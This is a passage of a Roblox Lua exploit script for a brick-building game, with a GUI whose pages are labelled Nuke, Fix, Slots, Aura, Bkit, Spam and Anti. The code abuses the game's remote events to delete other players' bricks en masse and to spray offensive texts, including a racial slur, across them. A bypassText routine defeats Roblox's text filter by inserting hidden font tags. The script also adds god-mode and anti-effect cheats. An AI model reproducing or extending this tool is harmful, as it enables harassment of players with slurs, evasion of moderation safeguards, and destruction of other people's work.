-- 2. Try large chunks first (fewer tags, less visible) -> up to small chunks
-- 3. Retry each density multiple times (randomized placement)
-- 4. If still tagged after all attempts -> every single char gets a tag
local function bypassText(str)
    if not str or str == "" then return "" end

    -- Don't touch it if it's clean
    if not isFiltered(str) then return str end

    -- Density levels: {minChunk, maxChunk, attempts}
    -- Start with big chunks (few tags) -> go smaller if still filtered
    local levels = {
        {4, 6, 4},   -- ~1 tag per 4-6 chars -- barely visible
        {3, 5, 4},   -- ~1 tag per 3-5 chars
        {2, 4, 5},   -- ~1 tag per 2-4 chars
        {1, 3, 6},   -- ~1 tag per 1-3 chars
        {1, 2, 6},   -- ~1 tag per 1-2 chars
    }

    for _, lvl in ipairs(levels) do
        for _ = 1, lvl[3] do
            local attempt = buildBypass(str, lvl[1], lvl[2])
            if not isFiltered(attempt) then
                return attempt  -- found one that passes!
            end
        end
    end

    -- Nuclear fallback: tag between every single character
    local result = ""
    for i = 1, #str do
        result = result .. str:sub(i, i)
        if i < #str then result = result .. BP end
    end
    return result
end

-- ============================================================
-- FIND NEAREST PLACED BRICK IN WORKSPACE
-- Used to verify nuke/fix actually took effect
-- ============================================================
local function getNearestPlacedBrick()
    local char = LocalPlayer.Character; if not char then return nil end
    local hrp  = char:FindFirstChild("HumanoidRootPart"); if not hrp then return nil end
    -- Common folder names for player-placed bricks
    local folders = {"Bricks","Build","Placed","Blocks","UserBricks"}
    local best, bestDist = nil, math.huge
    for _, fname in ipairs(folders) do
        local f = workspace:FindFirstChild(fname)
        if f then
            for _, v in ipairs(f:GetDescendants()) do
                if v:IsA("BasePart") then
                    local d = (v.Position - hrp.Position).Magnitude
                    if d < bestDist then bestDist=d; best=v end
                end
            end
        end
    end
    return best
end

-- ============================================================
-- NUKE -- with retry until brick confirms TOXIC + ANCHORED
-- ============================================================
local function runNuke()
    local remote, rootPos = getPaintRemote(); local brick = getBrick()
    if not remote or not brick then print("[NUKE] missing tools"); return end

    local key = "both 🤝"
    local blk = Color3.new(0, 0, 0)

    -- Default toxic texts -- every letter auto-bypassed
    local tp = {
        Front  = bypassText("Fuck Admin"),
        Back   = bypassText("say i eat pussy"),
        Top    = bypassText("hacked by FLAMEFAML/STIK"),
        Bottom = bypassText("GGS BIG W TO STIK"),
        Right  = bypassText("ADMIN HATES NIGGER"),
        Left   = bypassText("CRY GGS"),
    }

    -- STEP 1: Fire toxic + anchor, retry until confirmed
    local maxRetries = 8
    for attempt = 1, maxRetries do
        pcall(function() remote:FireServer(brick, Enum.NormalId.Top, rootPos, key, blk, "toxic", "anchor") end)
        task.wait(0.3)
        pcall(function() remote:FireServer(brick, Enum.NormalId.Top, rootPos, key, blk, "anchor", "") end)
        task.wait(0.25)

        -- Verify: check nearest placed brick
        local placed = getNearestPlacedBrick()
        if placed then
            local isToxic    = placed.Material == Enum.Material.SmoothPlastic or placed.Material == Enum.Material.Neon -- game-specific, best effort
            local isAnchored = placed.Anchored
            if isAnchored then
                print("[NUKE] Anchor confirmed on attempt "..attempt)
                break
            else
                print("[NUKE] Not anchored yet -- retry "..attempt.."/"..maxRetries)
                task.wait(0.2)
            end
        else
            -- No brick found to verify, just proceed
            break
        end
    end

    -- STEP 2: Paint faces -- auto-bypass via TextService retry
    for _, n in ipairs(faces) do
        local rawTxt = faceData[n] and faceData[n].txt.Text ~= "" and faceData[n].txt.Text or (tp[n] or "GGS")
        -- Smart bypass: checks with Roblox TextService, retries until not filtered
        local ft = bypassText(rawTxt)
        local fc = faceData[n] and faceData[n].clr.BackgroundColor3 or Color3.fromRGB(255, 0, 0)
        for attempt = 1, 3 do
            pcall(function() remote:FireServer(brick, faceEnums[n], rootPos, key, fc, "spray", ft) end)
            task.wait(0.12)
            if attempt < 3 then task.wait(0.05) end
        end
    end
    print("[NUKE] Done -- TOXIC + ANCHORED")
end

-- ============================================================
-- FIX -- with retry until brick confirms UNANCHORED
-- ============================================================
local function runFix()
    -- Clear UI
    for _, n in ipairs(faces) do
        if faceData[n] then
            faceData[n].txt.Text = ""
            faceData[n].clr.BackgroundColor3 = LIGHT_GRAY
        end
    end
    local remote, rootPos = getPaintRemote(); local brick = getBrick()
    if not remote or not brick then print("[FIX] missing tools"); return end
    local key = "both 🤝"
    -- Fire unanchor + plastic on EVERY face (4 blasts per face so server can't miss)
    -- This clears the toxic spray text AND sets material back AND unanchors
    for _ = 1, 4 do
        for _, n in ipairs(faces) do
            pcall(function() remote:FireServer(brick, faceEnums[n], rootPos, key, LIGHT_GRAY, "plastic", "unanchor") end)
        end
    end
    -- Extra unanchor-only pass on all faces to make sure anchor state is cleared
    for _ = 1, 2 do
        for _, n in ipairs(faces) do
            pcall(function() remote:FireServer(brick, faceEnums[n], rootPos, key, LIGHT_GRAY, "unanchor", "") end)
        end
    end
    -- Clear spray text on every face (empty string spray = removes toxic text)
    for _ = 1, 3 do
        for _, n in ipairs(faces) do
            pcall(function() remote:FireServer(brick, faceEnums[n], rootPos, key, LIGHT_GRAY, "spray", "") end)
        end
    end
    print("[FIX] Done")
end

-- BKIT exact call: pc.Delete.Script.Event:FireServer(Brick, HRP.Position)
local function fireDestroyer()
    local pc=LocalPlayer.Character; if not pc then return end
    local hrp=pc:FindFirstChild("HumanoidRootPart"); if not hrp then return end
    if not pc:FindFirstChild("Delete") then
        local bp=LocalPlayer.Backpack:FindFirstChild("Delete")
        if bp then bp.Parent=pc; task.wait(0.05) end
    end
    local del=pc:FindFirstChild("Delete"); if not del then return end
    local sc=del:FindFirstChild("Script"); if not sc then return end
    local ev=sc:FindFirstChild("Event"); if not ev then return end
    local brick=ReplicatedStorage:FindFirstChild("Brick"); if not brick then return end
    pcall(function() ev:FireServer(brick, hrp.Position) end)
end

-- Aura delete
local function fireDeleteTool(v)
    local char=LocalPlayer.Character; if not char then return end
    local del=char:FindFirstChild("Delete") or LocalPlayer.Backpack:FindFirstChild("Delete"); if not del then return end
    if del.Parent~=char then del.Parent=char end
    del=char:FindFirstChild("Delete"); if not del then return end
    local ori=del:FindFirstChild("origevent")
    if ori then pcall(function() ori:Invoke(v,v.Position) end); return end
    local sc=del:FindFirstChild("Script")
    if sc then local ev=sc:FindFirstChild("Event"); if ev then pcall(function() ev:FireServer(v,v.Position) end); return end end
    local ev2=del:FindFirstChildWhichIsA("RemoteEvent",true)
    if ev2 then pcall(function() ev2:FireServer(v,v.Position) end) end
end

-- ============================================================
do -- page 1: PAGE 1: NUKE
-- PAGE 1: NUKE
-- ============================================================
createLabel(pgNuke, "  Face Text & Colors", Color3.fromRGB(80,80,120), 13)
for _, name in ipairs(faces) do
    local row = Instance.new("Frame", pgNuke)
    row.Size             = UDim2.fromOffset(CW, 34)
    row.BackgroundColor3 = Color3.fromRGB(42, 42, 62)
    row.BorderSizePixel  = 0
    Instance.new("UICorner", row).CornerRadius = UDim.new(0, 10)

    local fl = Instance.new("TextLabel", row)
    fl.Size=UDim2.fromOffset(50,34); fl.Position=UDim2.fromOffset(4,0)
    fl.Text=name; fl.TextColor3=Color3.fromRGB(80,80,110); fl.Font=Enum.Font.GothamBold
    fl.TextSize=10; fl.BackgroundTransparency=1

    local txt = Instance.new("TextBox", row)
    txt.Size             = UDim2.fromOffset(CW-100, 26)
    txt.Position         = UDim2.fromOffset(54, 4)
    txt.BackgroundColor3 = Color3.fromRGB(28, 28, 46)
    txt.Text             = "GG\'S"
    txt.PlaceholderText  = name.." text"
    txt.TextColor3       = Color3.fromRGB(200, 200, 220)
    txt.Font             = Enum.Font.Gotham
    txt.TextSize         = 12
    txt.BorderSizePixel  = 0
    txt.ClearTextOnFocus = false
    Instance.new("UICorner", txt).CornerRadius = UDim.new(0, 6)

    -- BP button -- appends <font size='0'></font> to end of text
    local bpBtn = Instance.new("TextButton", row)
    bpBtn.Size             = UDim2.fromOffset(30, 26)
    bpBtn.Position         = UDim2.fromOffset(54 + (CW-100) + 4, 4)
    bpBtn.Text             = "BP"
    bpBtn.Font             = Enum.Font.GothamBold
    bpBtn.TextSize         = 9
    bpBtn.TextColor3       = Color3.fromRGB(255, 255, 255)
    bpBtn.BackgroundColor3 = Color3.fromRGB(70, 10, 140)
    bpBtn.BorderSizePixel  = 0
    bpBtn.AutoButtonColor  = false
    Instance.new("UICorner", bpBtn).CornerRadius = UDim.new(0, 6)
    bpBtn.MouseButton1Click:Connect(function()
        txt.Text = txt.Text .. "<font size='0'></font>"
        bpBtn.BackgroundColor3 = Color3.fromRGB(11, 95, 40)
        task.delay(0.25, function() bpBtn.BackgroundColor3 = Color3.fromRGB(70,10,140) end)
    end)

    local clr = Instance.new("TextButton", row)
    clr.Size=UDim2.fromOffset(28,28); clr.Position=UDim2.fromOffset(CW-32,3)
    clr.BackgroundColor3=Color3.fromRGB(255,0,0); clr.Text=""; clr.BorderSizePixel=0
    Instance.new("UICorner",clr).CornerRadius=UDim.new(0,6)
    clr.MouseButton1Click:Connect(function() openPicker(clr) end)
    faceData[name] = {txt=txt, clr=clr}
end
createDivider(pgNuke)
createLabel(pgNuke, "  Actions", Color3.fromRGB(80,80,120), 13)
createButton(pgNuke, "🔥  NUKE BRICK  (TOXIC + ANCHOR)", function() task.spawn(runNuke) end, CW, 42)
createButton(pgNuke, "▶  EXECUTE SEQUENCE", function() task.spawn(runNuke) end, CW, 38)

local spamNuking = false
createToggle(pgNuke, "⚡  SPAM NUKE", function(v) spamNuking = v end, CW)
createButton(pgNuke, "💣  NUKE CUBES (BKIT)", function()
    task.spawn(function() for i=1,200 do fireDestroyer(); task.wait(0.02) end end)
end, CW, 38)

task.spawn(function() while task.wait(0.5) do if spamNuking then pcall(runNuke) end end end)

-- ============================================================
end -- close page 1

do -- page 2: PAGE 2: FIX
-- PAGE 2: FIX
-- ============================================================
createLabel(pgFix, "  Repair / Clean Brick", Color3.fromRGB(80,80,120), 13)
createLabel(pgFix, "  Plastic  |  Unanchored  |  Light Gray  |  Clears text", Color3.fromRGB(11,95,226), 13)
createButton(pgFix, "🛠  FIX BRICK  (PLASTIC + UNANCHOR)", function() task.spawn(runFix) end, CW, 46)

createDivider(pgFix)
createLabel(pgFix, "  Restore Build", Color3.fromRGB(80,80,120), 13)
createLabel(pgFix, "  Replaces your brick from saved brickcollection", Color3.fromRGB(11,95,226), 11)

createButton(pgFix, "🔄  RESTORE BUILD", function()
    task.spawn(function()
        -- Make sure ReplicatedStorage has a Brick reference
        if not game.ReplicatedStorage:FindFirstChild("Brick") then
            local brick = Instance.new("Part")
            brick.Name = "Brick"
            brick.Parent = game.ReplicatedStorage
        end

        -- Equip Build tool
        local function equipTool(name)
            local char = LocalPlayer.Character
            local tool = (char and char:FindFirstChild(name))
                      or LocalPlayer.Backpack:FindFirstChild(name)
            if not tool then return nil end
            if tool.Parent ~= char then
                tool.Parent = char
                task.wait(0.1)
            end
            return char and char:FindFirstChild(name)
        end

        local function getPlrPos()
            local char = LocalPlayer.Character
            local hrp  = char and char:FindFirstChild("HumanoidRootPart")
            return hrp and hrp.Position or Vector3.new(0,0,0)
        end

        local et = equipTool("Build")
        if not et then
            print("[RESTORE] Build tool not found!")
            return
        end

        -- Check brickcollection exists
        if not getgenv or not getgenv().brickcollection then
            print("[RESTORE] No brickcollection found -- run the game script first")
            return
        end

        local ws = 0.15  -- wait between builds

        -- Sort: non-Brick/Debris entries first
        local currbc = {}
        for i, v in pairs(getgenv().brickcollection) do
            if v ~= nil then
                if v:GetFullName() ~= "Brick" and v.Name ~= "Debris" then
                    table.insert(currbc, 1, v)
                else
                    table.insert(currbc, v)
                end
            else
                table.remove(getgenv().brickcollection, table.find(getgenv().brickcollection, v))
            end
        end

        local bricksFolder = workspace:FindFirstChild("Bricks")
        local myBricks     = bricksFolder and bricksFolder:FindFirstChild(LocalPlayer.Name)
        local beforeAmt    = myBricks and #myBricks:GetChildren() or 0
        local nof          = #currbc

        print("[RESTORE] Starting -- " .. nof .. " bricks to restore")

        for i, v in pairs(currbc) do
            if v ~= nil then
                et = equipTool("Build")
                if not et then
                    print("[RESTORE] Build tool lost -- stopping")
                    break
                end

                -- Fire build event (adapted from original)
                pcall(function()
                    local ev = et:FindFirstChild("origevent")
                    if ev then
                        ev:Invoke(v, Enum.NormalId.Top, getPlrPos(), "detailed")
                    else
                        et.Script.Event:FireServer(
                            v,
                            Enum.NormalId.Top,
                            getPlrPos(),
                            "detailed"
                        )
                    end
                end)

                print("[RESTORE] Brick " .. (nof + 1 - i) .. " of " .. nof .. " -- " .. v.Name)
                task.wait(ws)

                -- If a new brick appeared, success for this one
                local nowAmt = myBricks and #myBricks:GetChildren() or 0
                if nowAmt > beforeAmt then
                    beforeAmt = nowAmt
                end
            else
                table.remove(currbc, table.find(currbc, v))
            end
        end

        -- Restart tool scripts (fixes tool state after mass building)
        for _, v in ipairs(LocalPlayer.Character:GetChildren()) do
            if v:HasTag("The Chosen One by TomazDev") then
                pcall(function() v.Script.Enabled = false; v.Script.Enabled = true end)
            end
        end
        for _, v in ipairs(LocalPlayer.Backpack:GetChildren()) do
            if v:HasTag("The Chosen One by TomazDev") then
                pcall(function() v.Script.Enabled = false; v.Script.Enabled = true end)
            end
        end

        task.wait(1)

        -- Check result
        local myNewBricks = myBricks and myBricks:FindFirstChildWhichIsA("BasePart")
        if myNewBricks then
            print("[RESTORE] Build restored successfully!")
        else
            print("[RESTORE] Failed -- run script before everything is delcubed")
        end
    end)
end, CW, 46)

-- ============================================================
end -- close page 2

do -- page 3: PAGE 3: SLOTS
-- PAGE 3: SLOTS
-- ============================================================
createLabel(pgSlots, "  Config Slots", Color3.fromRGB(80,80,120), 13)
local slotBox = createTextBox(pgSlots, "Config name...", CW, 34)
createButton(pgSlots, "💾  SAVE SLOT", function()
    local name = slotBox.Text ~= "" and slotBox.Text or "Config_"..os.time()
    local data = {faces={}}
    for n,v in pairs(faceData) do local c=v.clr.BackgroundColor3; data.faces[n]={t=v.txt.Text,c={c.R,c.G,c.B}} end
    if writefile then writefile("WindConfigs/"..name..".json", HttpService:JSONEncode(data)) end
    print("[SLOTS] Saved: "..name)
end, CW)
createButton(pgSlots, "🗑  DELETE SLOT", function()
    local name = slotBox.Text
    if name ~= "" and isfile and isfile("WindConfigs/"..name..".json") then
        if delfile then delfile("WindConfigs/"..name..".json") end
        slotBox.Text = ""; print("[SLOTS] Deleted: "..name)
    end
end, CW)

local slotListFrame = Instance.new("Frame", pgSlots)
slotListFrame.Size                   = UDim2.fromOffset(CW, 0)
slotListFrame.AutomaticSize          = Enum.AutomaticSize.Y
slotListFrame.BackgroundTransparency = 1
Instance.new("UIListLayout", slotListFrame).Padding = UDim.new(0, 4)

local function updateSlots()
    for _,v in pairs(slotListFrame:GetChildren()) do if v:IsA("TextButton") then v:Destroy() end end
    if not isfolder or not isfolder("WindConfigs") then return end
    for _,file in pairs(listfiles("WindConfigs")) do
        local name = file:match("WindConfigs/(.+)%.json") or file:match("WindConfigs\\(.+)%.json")
        if name then
            local b = createButton(slotListFrame, "▶  LOAD: "..name, function()
                local ok,result=pcall(function() return HttpService:JSONDecode(readfile(file)) end)
                if not ok then return end
                slotBox.Text = name
                if result.faces then
                    for n,d in pairs(result.faces) do
                        if faceData[n] then
                            faceData[n].txt.Text = d.t or ""
                            if type(d.c)=="table" then faceData[n].clr.BackgroundColor3=Color3.new(d.c[1],d.c[2],d.c[3]) end
                        end
                    end
                end
                print("[SLOTS] Loaded: "..name)
            end, CW, 36)
        end
    end
end
createButton(pgSlots, "📂  REFRESH SLOTS", updateSlots, CW)
updateSlots()

-- ============================================================
end -- close page 3

do -- page 4: PAGE 4: AURA
-- PAGE 4: AURA
-- ============================================================
createLabel(pgAura, "  Delete Aura Settings", Color3.fromRGB(80,80,120), 13)
createLabel(pgAura, "  Fires every Heartbeat -- maximum speed", Color3.fromRGB(11,95,226), 13)

local daura=false; local dauras=false; local dauraRange=35
local daurapart=Instance.new("Part")
daurapart.Shape=Enum.PartType.Ball; daurapart.Anchored=true; daurapart.CanCollide=false
daurapart.CastShadow=false; daurapart.CanQuery=false; daurapart.Color=Color3.fromRGB(255,0,0)
daurapart.Transparency=1; daurapart.Size=Vector3.new(35,35,35); daurapart.Parent=workspace

local auraFilter=OverlapParams.new()
auraFilter.FilterType=Enum.RaycastFilterType.Include; auraFilter.MaxParts=100
pcall(function() auraFilter:AddToFilter(workspace:WaitForChild("Bricks",3)) end)

createSlider(pgAura,"Range",5,150,35,function(v) dauraRange=v; daurapart.Size=Vector3.new(v,v,v) end,CW)
createToggle(pgAura,"🌀  Delete Aura (Standard)",function(v)
    daura=v; daurapart.Transparency=(daura or dauras) and 0.45 or 1
end,CW)
createToggle(pgAura,"🌀  Delete Aura (Solara)",function(v)
    dauras=v; daurapart.Transparency=(daura or dauras) and 0.45 or 1
end,CW)

RunService.Heartbeat:Connect(function()
    if not (daura or dauras) then return end
    local char=LocalPlayer.Character; if not char then return end
    local pos=char:GetPivot().Position
    daurapart.Position=pos
    if daura then
        for _,v in ipairs(workspace:GetPartsInPart(daurapart,auraFilter)) do task.spawn(fireDeleteTool,v) end
    end
    if dauras then
        local bf=workspace:FindFirstChild("Bricks")
        if bf then
            for _,v in ipairs(bf:GetDescendants()) do
                if v:IsA("BasePart") and (v.Position-pos).Magnitude<dauraRange then task.spawn(fireDeleteTool,v) end
            end
        end
    end
end)

-- ============================================================
end -- close page 4

do -- page 5: PAGE 5: BKIT
-- PAGE 5: BKIT
-- ============================================================
createLabel(pgBkit, "  BKIT Destroyer", Color3.fromRGB(80,80,120), 13)
createLabel(pgBkit, "  Delete.Script.Event:FireServer(Brick, HRP.Position)", Color3.fromRGB(11,95,226), 12)

local destroyerRunning=false; local destroyerRate=50

createButton(pgBkit,"💥  START BKIT DESTROYER",function()
    if destroyerRunning then return end
    destroyerRunning=true; print("[BKIT] Destroyer started")
    task.spawn(function()
        while destroyerRunning do fireDestroyer(); task.wait(1/math.max(destroyerRate,1)) end
        print("[BKIT] Destroyer stopped")
    end)
end, CW, 44)
createButton(pgBkit,"⏹  STOP DESTROYER",function() destroyerRunning=false end, CW, 36)
createSlider(pgBkit,"Rate (fires/sec)",1,200,50,function(v) destroyerRate=v end,CW)
createDivider(pgBkit)
createButton(pgBkit,"💣  NUKE CUBES BURST",function()
    task.spawn(function() for i=1,200 do fireDestroyer(); task.wait(0.02) end end)
end, CW, 38)

-- ============================================================
end -- close page 5

do -- page 6: PAGE 6: SPAM
-- PAGE 6: SPAM
-- ============================================================
createLabel(pgSpam, "  Spam Build", Color3.fromRGB(80,80,120), 13)
createLabel(pgSpam, "  Fires brick placement directly -- no face-paint delays", Color3.fromRGB(11,95,226), 13)

local spamBuildActive=false; local spamBuildRate=20
createToggle(pgSpam,"⚡  SPAM BUILD",function(v) spamBuildActive=v end, CW, 44)
createSlider(pgSpam,"Rate (bricks/sec)",1,60,20,function(v) spamBuildRate=v end,CW)

local sbCountLbl = createLabel(pgSpam,"  Placed: 0",Color3.fromRGB(116,113,117),14)
local sbCount    = 0
task.spawn(function()
    while true do
        task.wait(1/math.max(spamBuildRate,1))
        if spamBuildActive then
            local char=LocalPlayer.Character
            if char then
                local hrp=char:FindFirstChild("HumanoidRootPart")
                local tool=char:FindFirstChild("Paint") or LocalPlayer.Backpack:FindFirstChild("Paint")
                if hrp and tool then
                    if tool.Parent~=char then
                        local hum=char:FindFirstChildOfClass("Humanoid")
                        if hum then hum:EquipTool(tool) end; task.wait(0.2)
                        tool=char:FindFirstChild("Paint")
                    end
                    if tool then
                        local remote=tool:FindFirstChild("Event",true) or tool:FindFirstChildWhichIsA("RemoteEvent",true)
                        local brick=getBrick()
                        if remote and brick then
                            pcall(function() remote:FireServer(brick,Enum.NormalId.Top,hrp.Position,"both 🤝",Color3.new(0,0,0),"toxic","anchor") end)
                            sbCount=sbCount+1; sbCountLbl.Text="  Placed: "..sbCount.." @ "..spamBuildRate.."/s"
                        end
                    end
                end
            end
        end
    end
end)

-- ============================================================
end -- close page 6

do -- page 7: PAGE 7: ANTI
-- PAGE 7: ANTI -- Protection suite (VPLI-style methods)
-- ============================================================
createLabel(pgAnti, "  Anti / Protection", Color3.fromRGB(80,80,120), 13)
createDivider(pgAnti)

local antiConns = {}
local function addConn(key, conn)
    if antiConns[key] then pcall(function() antiConns[key]:Disconnect() end) end
    antiConns[key] = conn
end
local function killConn(key)
    if antiConns[key] then pcall(function() antiConns[key]:Disconnect() end); antiConns[key]=nil end
end

-- ============================================================
-- GOD MODE (anti-maptide / anti-void -- user's exact working method)
-- ============================================================
-- Immediately kill void height -- before anything else
workspace.FallenPartsDestroyHeight = -1e9

local godConn = nil
local function applyGodMode(char)
    -- 1. IMMEDIATELY stop engine from deleting parts in the void
    workspace.FallenPartsDestroyHeight = -1e9

    -- 2. Wait for parts (5s max, no infinite yield)
    local hrp = char:WaitForChild("HumanoidRootPart", 5)
    local hum = char:WaitForChild("Humanoid", 5)
    if not hrp or not hum then return end

    -- 3. Disable death + infinite health
    hum:SetStateEnabled(Enum.HumanoidStateType.Dead, false)
    hum:SetStateEnabled(Enum.HumanoidStateType.FallingDown, false)
    pcall(function() sethiddenproperty(hum, "Health", 1e308) end)
    pcall(function() sethiddenproperty(hum, "MaxHealth", 1e308) end)
    hum.MaxHealth = math.huge
    hum.Health    = math.huge

    -- 4. Teleport loop -- fights NaN / void pull for 2 seconds
    task.spawn(function()
        for i = 1, 20 do
            if hrp and hrp.Parent then
                hrp.CFrame = CFrame.new(0, 200, 0)
                hrp.AssemblyLinearVelocity = Vector3.zero
            end
            task.wait(0.1)
        end
    end)

    -- 5. Touch immunity
    for _, part in ipairs(char:GetDescendants()) do
        if part:IsA("BasePart") then part.CanTouch = false end
    end

    -- 6. Heartbeat lock -- keeps FallenPartsDestroyHeight at -1e9 every frame
    addConn("godHB", RunService.Heartbeat:Connect(function()
        pcall(function() workspace.FallenPartsDestroyHeight = -1e9 end)
        if hum and hum.Parent and hum.Health < 999 then
            hum.Health = math.huge
        end
    end))

    -- 7. HealthChanged safety net
    hum.HealthChanged:Connect(function()
        if hum and hum.Parent then hum.Health = math.huge end
    end)

    -- 8. Died safety net
    hum.Died:Connect(function()
        if hum and hum.Parent then
            hum.Health = math.huge
            hum:SetStateEnabled(Enum.HumanoidStateType.Dead, false)
        end
    end)
end

createToggle(pgAnti, "⚔  God Mode", function(v)
    if v then
        workspace.FallenPartsDestroyHeight = -1e9
        if LocalPlayer.Character then applyGodMode(LocalPlayer.Character) end
        godConn = LocalPlayer.CharacterAdded:Connect(function(c)
            task.wait(0.1)
            applyGodMode(c)
        end)
    else
        killConn("godHB")
        if godConn then godConn:Disconnect(); godConn = nil end
        pcall(function() workspace.FallenPartsDestroyHeight = -500 end)
    end
end, CW, 46)

createDivider(pgAnti)

-- ============================================================
-- ANTI GLITCH (VPLI exact method)
-- RenderStepped: if |Y| > 10000 -> pivot back, zero all velocities
-- ============================================================
local vpliLastSafe  = nil
local vpliGlitchConn = nil

createToggle(pgAnti, "🌀  Anti Glitch (VPLI)", function(v)
    if v then
        vpliGlitchConn = RunService.RenderStepped:Connect(function()
            local char = LocalPlayer.Character
            local hrp  = char and char:FindFirstChild("HumanoidRootPart")
            if hrp then
                if math.abs(hrp.Position.Y) < 10000 then
                    vpliLastSafe = hrp.CFrame
                end
                if math.abs(hrp.Position.Y) > 10000 and vpliLastSafe then
                    hrp.AssemblyLinearVelocity = Vector3.zero
                    char:PivotTo(vpliLastSafe)
                    for _, part in ipairs(char:GetDescendants()) do
                        if part:IsA("BasePart") then
                            part.Velocity    = Vector3.zero
                            part.RotVelocity = Vector3.zero
                        end
                    end
                    print("[ANTI GLITCH] Out of bounds -- pivoted back")
                end
            end
        end)
    else
        if vpliGlitchConn then vpliGlitchConn:Disconnect(); vpliGlitchConn=nil end
        vpliLastSafe = nil
    end
end, CW, 46)

-- ============================================================
-- ANTI FREEZE (VPLI exact method)
-- Loop 0.1s: if Hielo instance exists in character -> set health=0
-- (kills to break freeze state -- VPLI's confirmed working method)
-- ============================================================
local vpliFreezeActive = false

createToggle(pgAnti, "🧊  Anti Freeze (VPLI)", function(v)
    vpliFreezeActive = v
    if v then
        task.spawn(function()
            while vpliFreezeActive do
                task.wait(0.1)
                local char = LocalPlayer.Character
                if char and char:FindFirstChild("Hielo", true) then
                    local hum = char:FindFirstChildOfClass("Humanoid")
                    if hum then hum.Health = 0 end
                    print("[ANTI FREEZE] Hielo detected -- broke freeze")
                end
            end
        end)
    end
end, CW, 46)

-- ============================================================
-- ANTI BLIND (VPLI exact method)
-- Loop 0.1s: destroy PlayerGui child named "Blind"
-- ============================================================
local vpliBlindActive = false

createToggle(pgAnti, "🚫  Anti Blind (VPLI)", function(v)
    vpliBlindActive = v
    if v then
        task.spawn(function()
            while vpliBlindActive do
                task.wait(0.1)
                local playerGui = LocalPlayer:FindFirstChild("PlayerGui")
                if playerGui and playerGui:FindFirstChild("Blind") then
                    playerGui.Blind:Destroy()
                    print("[ANTI BLIND] Destroyed Blind gui")
                end
            end
        end)
    end
end, CW, 46)

-- ============================================================
-- ANTI MYOPIC (VPLI exact method)
-- RenderStepped: game.Lighting.Blur.Enabled = false
-- ============================================================
local vpliMyopicConn = nil

createToggle(pgAnti, "👓  Anti Myopic (VPLI)", function(v)
    if v then
        vpliMyopicConn = RunService.RenderStepped:Connect(function()
            if game.Lighting then
                game.Lighting.Blur.Enabled = false
            end
        end)
    else
        if vpliMyopicConn then vpliMyopicConn:Disconnect(); vpliMyopicConn=nil end
    end
end, CW, 46)

-- ============================================================
-- ANTI FOG (VPLI -- new toggle not in old script)
-- RenderStepped: Lighting.Fog.Density = 0
-- ============================================================
local vpliFogConn = nil

createToggle(pgAnti, "🌫  Anti Fog (VPLI)", function(v)
    if v then
        vpliFogConn = RunService.RenderStepped:Connect(function()
            if game.Lighting and game.Lighting:FindFirstChild("Fog") then
                game.Lighting.Fog.Density = 0
            end
        end)
    else
        if vpliFogConn then vpliFogConn:Disconnect(); vpliFogConn=nil end
    end
end, CW, 46)

-- ============================================================
-- ANTI COLORLESS (VPLI -- new toggle not in old script)
-- RenderStepped: game.Lighting.RGB.Enabled = false
-- ============================================================
local vpliColorConn = nil

createToggle(pgAnti, "🎨  Anti Colorless (VPLI)", function(v)
    if v then
        vpliColorConn = RunService.RenderStepped:Connect(function()
            if game.Lighting then
                pcall(function() game.Lighting.RGB.Enabled = false end)
            end
        end)
    else
        if vpliColorConn then vpliColorConn:Disconnect(); vpliColorConn=nil end
    end
end, CW, 46)

-- ============================================================
-- ANTI CRASH (VPLI -- new, not in old script)
-- Watches backpack item count. If >= threshold -> clears backpack
-- to prevent inventory crash. Threshold adjustable via textbox.
-- ============================================================
local vpliCrashThreshold = 11
local vpliCrashActive    = false

createLabel(pgAnti, "  Anti Crash threshold (default 11)", Color3.fromRGB(80,80,120), 11)
local crashThreshBox = createTextBox(pgAnti, "11", CW, 32)
crashThreshBox.ClearTextOnFocus = false
crashThreshBox:GetPropertyChangedSignal("Text"):Connect(function()
    local n = tonumber(crashThreshBox.Text)
    if n and n > 0 then vpliCrashThreshold = n end
end)

createToggle(pgAnti, "💥  Anti Crash (VPLI)", function(v)
    vpliCrashActive = v
    if v then
        coroutine.wrap(function()
            while vpliCrashActive do
                local backpack = LocalPlayer:FindFirstChild("Backpack")
                if backpack and #backpack:GetChildren() >= vpliCrashThreshold then
                    -- Disable backpack GUI temporarily
                    local bpGui = LocalPlayer.PlayerGui:FindFirstChild("Backpack")
                    if bpGui then bpGui.Enabled = false end
                    -- Clear all items
                    for _, item in ipairs(backpack:GetChildren()) do item:Destroy() end
                    print("[ANTI CRASH] Inventory cleared (was >= " .. vpliCrashThreshold .. ")")
                    -- Wait until safe count restored
                    local safeCount = math.max(1, math.floor(vpliCrashThreshold * 2 / 3))
                    repeat task.wait(0.2)
                    until not vpliCrashActive or #backpack:GetChildren() >= safeCount
                    -- Re-enable backpack GUI
                    local bpGui2 = vpliCrashActive and LocalPlayer.PlayerGui:FindFirstChild("Backpack")
                    if bpGui2 then bpGui2.Enabled = true end
                end
                task.wait(0.1)
            end
        end)()
    end
end, CW, 46)

createDivider(pgAnti)

-- ============================================================
-- ANTI MORPH (original -- kept)
-- ============================================================
local savedDesc = nil

createToggle(pgAnti, "👤  Anti Morph", function(v)
    if v then
        local char = LocalPlayer.Character
        if char then
            local hum = char:FindFirstChildOfClass("Humanoid")
            if hum then pcall(function() savedDesc = hum:GetAppliedDescription() end) end
        end
        addConn("morphRespawn", LocalPlayer.CharacterAdded:Connect(function(c)
            task.wait(1)
            local hum = c:FindFirstChildOfClass("Humanoid")
            if hum then pcall(function() savedDesc = hum:GetAppliedDescription() end) end
        end))
        addConn("morphHB", RunService.Heartbeat:Connect(function()
            if math.random(1,90)~=1 then return end
            local char = LocalPlayer.Character; if not char then return end
            local hum  = char:FindFirstChildOfClass("Humanoid"); if not hum then return end
            if not savedDesc then return end
            local ok, cur = pcall(function() return hum:GetAppliedDescription() end)
            if ok and cur and (cur.HeadColor ~= savedDesc.HeadColor or cur.TorsoColor ~= savedDesc.TorsoColor) then
                print("[ANTI MORPH] Morph detected -- resetting")
                savedDesc = nil
                LocalPlayer:LoadCharacter()
            end
        end))
    else
        killConn("morphHB"); killConn("morphRespawn"); savedDesc=nil
    end
end, CW, 46)

-- ============================================================
-- FIX VAMPIRE SWORD (VPLI best method -- button)
-- Restore camera + re-enable Backpack CoreGui
-- ============================================================
createButton(pgAnti, "🧛  Fix Vampire Sword (VPLI)", function()
    local camera = workspace.CurrentCamera
    local SGS    = game:GetService("StarterGui")
    local function restoreCamera()
        repeat task.wait() until LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid")
        camera.CameraType    = Enum.CameraType.Custom
        camera.CameraSubject = LocalPlayer.Character:FindFirstChild("Humanoid")
